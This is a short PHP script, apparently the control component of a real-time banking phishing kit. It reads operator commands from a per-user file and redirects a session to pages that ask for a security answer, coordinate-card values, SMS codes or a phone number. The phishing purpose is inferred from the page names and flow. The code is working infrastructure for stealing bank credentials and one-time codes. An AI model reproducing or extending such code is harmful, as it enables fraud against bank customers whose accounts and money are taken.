<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['usuario'])) exit;

$usuario = $_SESSION['usuario'];
$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    // Reemplazamos str_starts_with por substr()
    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
        $pregunta = explode("/palabra clave/", $accion)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    if ($accion == "/SMS") {
        header("Location: sms.php");
        exit;
    }

    if ($accion == "/SMSERROR") {
        header("Location: smserror.php");
        exit;
    }
    if ($accion == "/NUMERO") {
        header("Location: numero.php");
        exit;
    }
    if ($accion == "/ERROR") {
        header("Location: index2.php");
        exit;
    }
}
?>
